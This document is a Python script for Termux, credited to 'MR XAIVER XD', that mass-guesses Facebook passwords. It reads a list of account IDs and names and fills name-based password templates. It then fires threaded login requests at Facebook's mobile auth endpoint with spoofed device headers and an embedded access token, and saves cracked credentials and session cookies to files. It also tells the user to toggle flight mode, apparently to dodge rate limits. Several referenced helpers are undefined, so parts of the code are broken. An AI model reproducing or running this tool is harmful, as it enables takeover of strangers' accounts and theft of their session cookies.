#!/usr/bin/python
#!/data/data/com.termux/files/usr/bin/python3.11
#_____________| IMPORT |_____________#
from os import system as osRUB
from os import system as cmd
os.system('clear')
print('loading Modules ...\n')
try:
    import requests 
except ImportError:
    print('\n  installing Requests ...\n')
    os.system('pip install requests')
try:
    import concurrent.futures
except ImportError:
    print('\n  installing futures ...\n')
    os.system('pip install futures')
try:
    import mechanize
except ModuleNotFoundError:
    os.system('pip install mechanize > /dev/null')
from urllib.request import Request, urlopen
import os, requests, re,platform, sys, random, subprocess, threading, itertools,base64,uuid,zlib,re,json,uuid,subprocess,shutil,webbrowser,time,json,sys,random,datetime,time,re,subprocess,platform,string,json,time,re,random,sys,string,uuid
from concurrent.futures import ThreadPoolExecutor as Sexy
from string import * 
from random import randint
from time import sleep as slp
from os import system as cmd
from zlib import decompress 
import os, platform
from concurrent.futures import ThreadPoolExecutor
#_____________| COUNTER |_____________#
totaldmp,count,loop,oks,cps,id,ps,sid = 0,0,0,[],[],[],[],[]
total,methods,srange,saved,totaldmp,filter=[],[],0,[],0,[]
sys.stdout.write('\x1b]2; XAIVER\x07')
#_____________| METHOD2 |_____________#
def Method2():
    vchrome = str(random.randint(100,925))+".0.0."+str(random.randint(1,8))+"."+str(random.randint(40,150))
    VAPP = random.randint(410000000,499999999)
    END = '[FBAN/FB4A;FBAV/374.0.0.20.109;FBBV/381462200;FBDM/{density=2.0,width=720,height=1456};FBLC/en_US;FBRV/382083935;FBCR/1010;FBMF/Green;FBBD/Green;FBPN/com.facebook.katana;FBDV/GREEN 2020;FBSV/11;FBOP/1;FBCA/arm64-v8a:;]'
    ua = f'Dalvik/2.1.0 (Linux; U; Android {random.randint(4,13)}; {random.choice(model2)} Build/QP1A.{random.randint(111111,999999)}.{random.randint(111,999)}) '+END
    return ua
#_____________| METHOD1 |_____________#
def Method1():
    END = '[FBAN/EMA;FBBV/352223683;FBAV/291.0.0.12.110;FBDV/SM-G935FD;FBLC/en_GB;FBNG/WIFI;FBMNT/NOT_METERED;FBDM/{density=1.0125}]'
    ua = f'Dalvik/2.1.0 (Linux; U; Android {random.randint(4,13)}; {random.choice(model2)} Build/QP1A.{random.randint(111111,999999)}.{random.randint(111,999)}) '+END
    return ua
#_____________| COLOUR |_____________#
S = '\033[1;37m'
A = '\x1b[38;5;208m'
R = '\x1b[38;5;46m'
F = '\x1b[38;5;48m'
Z = '\033[1;33m'
#_____________| LINEX |_____________#
def linex():
	print(48*'-')
#_____________| LOGO |_____________#
logo ='''
   db    88        db    8b    d8 88 88b 88 
  dPYb   88       dPYb   88b  d88 88 88Yb88 
 dP__Yb  88  .o  dP__Yb  88YbdP88 88 88 Y88 
dP""""Yb 88ood8 dP""""Yb 88 YY 88 88 88  Y8 
\033[1;37m------------------------------------------------
\033[1;37m[+] Owner     :       MR XAIVER XD
\033[1;37m[+] Telegram  :       t.me/Mr_NxT_143
\033[1;37m[+] Github    :       XAIVER-XD
\033[1;37m[+] Version   :       7.8
\033[1;37m------------------------------------------------ '''
#_____________| CLEAR |_____________#
def clear():
    os.system("clear")
    print(logo)    
#_____________| RESULT |_____________#    
def result(oks,cps):
    if len(oks) != 0 or len(cps) != 0:
        print('\n')
        print(47*'-')
        print(' The Process has been Complete...')
        print(' TOTAL OK: %s' % str(len(oks)))
        print(' TOTAL CP: %s' % str(len(cps)))
        print(47*'-')
        input("Press enter to back TCS Menu ")
        exit()
#_____________| MAIN DEF |_____________#
def MainX():   
    os.system('clear')
    print(logo)
    print(f'[1] File Crack')
    print(f'[2] Found Owner ')
    print(f'[0] Exit Terminal  ')
    linex()
    select = input('Select Menu>: ')
    if select =='1':
        method_crack()
    elif select =='2':
        exit(' This is Option Soon available ... ')
    else:
        print('\n Select valid option ... ')
        time.sleep(2)
        sarfraz()
#_____________| METHOD CRACK |_____________#        
def method_crack():
    global methods
    clear()
    print(f'[1] Method {1}')
    print(f'[2] Method {2}')
    print(f'[0] Back')
    linex()
    option = input('Select method>: ')
    if option =='1':
        methods.append('methodA')
        main_crack().crack(id)
    elif option =='2':
        methods.append('methodB')
        main_crack().crack(id)
    elif option =='0':
        sarfraz()
    else:
      print('\n Select Valid Option ...')
      time.sleep(2)
      method_crack()
#_____________| CLASS MAIN |_____________#
class main_crack():
    def __init__(self):
        self.id=[]
    def crack(self,id):
        global methods
        clear()
        self.file = input('Put File Name : ')
        try:
            self.id = open(self.file).read().splitlines()
            self.pasw()
        except FileNotFoundError:
            print('Opps File Not Found ...')
            time.sleep(2)
            os.system('clear')
            print(logo)
            print('Try Again ...')
            time.sleep(2)
            main_crack().crack(id)
#_____________| METHOD M1 |_____________#            
    def methodA(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r {S}[Running] {loop} | M1 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
            except:
                ls = fs
            for pw in psw:
                ps = pw.replace('first',fs.lower()).replace('First',fs).replace('last',ls.lower()).replace('Last',ls).replace('Name',name).replace('name',name.lower())
                fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
                fbbv = str(random.randint(111111111,999999999))
                android_version = device['android_version']
                model = device['model']
                build = device['build']
                fblc = device['fblc']
                fbcr = sim_id
                fbmf = device['fbmf']
                fbbd = device['fbbd']
                fbdv = device['fbdv']
                fbsv = device['fbsv']
                fbca = device['fbca']
                fbdm = device['fbdm']
                fbfw = '1'
                fbrv = '0'
                fban = 'FB4A'
                fbpn = 'com.facebook.katana'
                en = random.choice(['en_US','en_GB'])
                cph = random.choice(['CPH1979','CPH1983','CPH1987','CPH2005','CPH2009','CPH2015','CPH2059','CPH2061','CPH2065','CPH2069','CPH2071','CPH2073','CPH2077','CPH2091','CPH2095','CPH2099','CPH2137','CPH2139','CPH2145','CPH2161','CPH2185','CPH2201','CPH2209','CPH1801','CPH1803','CPH1805','CPH1809','CPH1827','CPH1837','CPH1851','CPH1853'])
                network = random.choice(['Zong','null','Marshmallow','Telekom China'])
                random_seed = random.Random()
                adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
                sm=['GT-', 'SM-']
                device_id = str(uuid.uuid4())
                secure = str(uuid.uuid4())
                family = str(uuid.uuid4())
                accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                xd =str(''.join(random_seed.choices(string.digits, k=20)))
                sim_serials = f'["{xd}"]'
                li = ['28','29','210']
                li2 = random.choice(li)
                j1 = ''.join(random.choice(digits) for _ in range(2))
                jazoest = li2+j1
                ua = ua1().replace("DALVIK",dlvk()).replace("RANDOM",ran())                     
                with requests.Session() as session:
                    data = {"adid": str(uuid.uuid4()),
                    "format": "json",
                    "device_id": str(uuid.uuid4()),
                    "cpl": "true",
                    "family_device_id": str(uuid.uuid4()),
                    "credentials_type": "device_based_login_password",
                    "error_detail_type": "button_with_disabled",
                    "source": "device_based_login",
                    "email": sid,
                    "password": ps,
                    "access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32",
                    "generate_session_cookies": "1",
                    "meta_inf_fbmeta": "",
                    "advertiser_id": str(uuid.uuid4()),
                    "currently_logged_in_userid": "0",
                    "locale": "en_GB",
                    "client_country_code": "GB",
                    "method": "auth.login",
                    "fb_api_req_friendly_name": "authenticate",
                    "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
                    "api_key": "882a8490361da98702bf97a021ddc14d"}
                headers = {'User-Agent': Method2(),
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'Host': 'graph.facebook.com',
                    'X-FB-Net-HNI': str(random.randint(20000, 40000)),
                    'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
                    'X-FB-Connection-Type': 'MOBILE.LTE',
                    'X-Tigon-Is-Retry': 'False',
                    'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
                    'x-fb-device-group': '5120',
                    'X-FB-Friendly-Name': 'ViewerReactionsMutation',
                    'X-FB-Request-Analytics-Tags': 'graphservice',
                    'X-FB-HTTP-Engine': 'Liger',
                    'X-FB-Client-IP': 'True',
                    'X-FB-Server-Cluster': 'True',
                    'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
                q = session.post("https://b-graph.facebook.com/auth/login",data=data, headers=headers, allow_redirects=False).json()
                if 'session_key' in q:
                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={ssbb};{ckkk}"
                    print(f"\r{R} [SUCCES-💚] {sid} | {ps} {S}")
                    oks.append(sid)
                    open('/sdcard/Successful_ids_M1.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/COOKiEs_M1.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
                     print(f"\r{A} [TWO-F💔] {sid} | {ps} {S}")
                     cps.append(sid)
                     open('/sdcard/CheckPoint.txt','a').write(sid+'|'+ps+'\n')
                else:
                    continue
            loop+=1
        except requests.exceptions.ConnectionError:
            self.methodA(sid, name, ps)
            
#_____________| METHOD M2 |_____________#    
    def methodB(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r {S}[Running] {loop} | M2 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
            except:
                ls = fs
            for pw in psw:
                ps = pw.replace('first',fs.lower()).replace('First',fs).replace('last',ls.lower()).replace('Last',ls).replace('Name',name).replace('name',name.lower())
                fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
                fbbv = str(random.randint(111111111,999999999))
                android_version = device['android_version']
                model = device['model']
                build = device['build']
                fblc = device['fblc']
                fbcr = sim_id
                fbmf = device['fbmf']
                fbbd = device['fbbd']
                fbdv = device['fbdv']
                fbsv = device['fbsv']
                fbca = device['fbca']
                fbdm = device['fbdm']
                fbfw = '1'
                fbrv = '0'
                fban = 'FB4A'
                fbpn = 'com.facebook.katana'
                en = random.choice(['en_US','en_GB'])
                cph = random.choice(['CPH1979','CPH1983','CPH1987','CPH2005','CPH2009','CPH2015','CPH2059','CPH2061','CPH2065','CPH2069','CPH2071','CPH2073','CPH2077','CPH2091','CPH2095','CPH2099','CPH2137','CPH2139','CPH2145','CPH2161','CPH2185','CPH2201','CPH2209','CPH1801','CPH1803','CPH1805','CPH1809','CPH1827','CPH1837','CPH1851','CPH1853'])
                network = random.choice(['Zong','null','Marshmallow','Telekom China'])
                random_seed = random.Random()
                adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
                sm=['GT-', 'SM-']
                device_id = str(uuid.uuid4())
                secure = str(uuid.uuid4())
                family = str(uuid.uuid4())
                accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                xd =str(''.join(random_seed.choices(string.digits, k=20)))
                sim_serials = f'["{xd}"]'
                li = ['28','29','210']
                li2 = random.choice(li)
                j1 = ''.join(random.choice(digits) for _ in range(2))
                jazoest = li2+j1
                ua = ua1().replace("DALVIK",dlvk()).replace("RANDOM",ran())
                with requests.Session() as session:
                    data = {"adid": str(uuid.uuid4()),
                    "format": "json",
                    "device_id": str(uuid.uuid4()),
                    "cpl": "true",
                    "family_device_id": str(uuid.uuid4()),
                    "credentials_type": "device_based_login_password",
                    "error_detail_type": "button_with_disabled",
                    "source": "device_based_login",
                    "email": sid,
                    "password": ps,
                    "access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32",
                    "generate_session_cookies": "1",
                    "meta_inf_fbmeta": "",
                    "advertiser_id": str(uuid.uuid4()),
                    "currently_logged_in_userid": "0",
                    "locale": "en_GB",
                    "client_country_code": "GB",
                    "method": "auth.login",
                    "fb_api_req_friendly_name": "authenticate",
                    "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
                    "api_key": "882a8490361da98702bf97a021ddc14d"}
                headers = {'User-Agent': ua,
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'Host': 'graph.facebook.com',
                    'X-FB-Net-HNI': str(random.randint(20000, 40000)),
                    'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
                    'X-FB-Connection-Type': 'MOBILE.LTE',
                    'X-Tigon-Is-Retry': 'False',
                    'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
                    'x-fb-device-group': '5120',
                    'X-FB-Friendly-Name': 'ViewerReactionsMutation',
                    'X-FB-Request-Analytics-Tags': 'graphservice',
                    'X-FB-HTTP-Engine': 'Liger',
                    'X-FB-Client-IP': 'True',
                    'X-FB-Server-Cluster': 'True',
                    'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
                q = session.post("https://b-graph.facebook.com/auth/login",data=data, headers=headers, allow_redirects=False).json()
                if 'session_key' in q:
                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={ssbb};{ckkk}"
                    print(f"\r{R} [Successful] {sid} | {ps} {S}")
                    oks.append(sid)
                    open('/sdcard/Successful_ids_M2.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/SSB_iDs_COOKiEs_M2.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
                    print(f"\r{A} [CheckPoint] {sid} | {ps} {S}")
                    cps.append(sid)
                    open('/sdcard/CheckPoint.txt','a').write(sid+'|'+ps+'\n')
                else:
                    continue
            loop+=1
        except requests.exceptions.ConnectionError:
            self.methodB(sid, name, ps)

    
#_____________| PASSWORD |_____________#            
    def pasw(self):       
            pw = []
            clear()
            print('{S}[+] How Many Password Do You Want To Add?')
            linex()
            sl = int(input('{S}[+] Input : '))
            os.system("clear")
            print(logo)
            print(f'{S}[+] Example : [first123,last1122,firstlast,last,ETC]')
            if sl =='':
                print('\n Put limit between 1 to 30')
            elif sl > 30:
                print('\nPassword limit Should Not Be Greater Than 30')
            else:
                for sr in range(sl):
                    pw.append(input(f'Password {sr+1}: '))
            os.system("clear")
            print(logo)            
            print(f'{S}[+] Total IDs :{F} %s ' % len(self.id))
            print(f'{S}[+] Cracking Started Plz Wait Bro...')
            print(f"{S}[+] {A}Use Flight {S}(✈️) {A}Mode Before Use {S}")
            print(47*"-")
            with Sexy(max_workers=30) as alamin:
                for zsb in self.id:
                   try:
                       uid, name = zsb.split('|')
                       sz = name.split(' ')
                       if len(sz) == 3 or len(sz) == 4 or len(sz) == 5 or len(sz) == 8:
                           pwx =  pw
                       else:
                            pwx =  pw
                            if 'methodA' in methods:
                                alamin.submit(self.methodA, uid, name, pwx)
                            elif 'methodB' in methods:
                                alamin.submit(self.methodB, uid, name, pwx)
                   except:pass
            result(oks,cps)   
            
#_____________| EXIT DEF |_____________#
if __name__=="__main__":
    MainX()
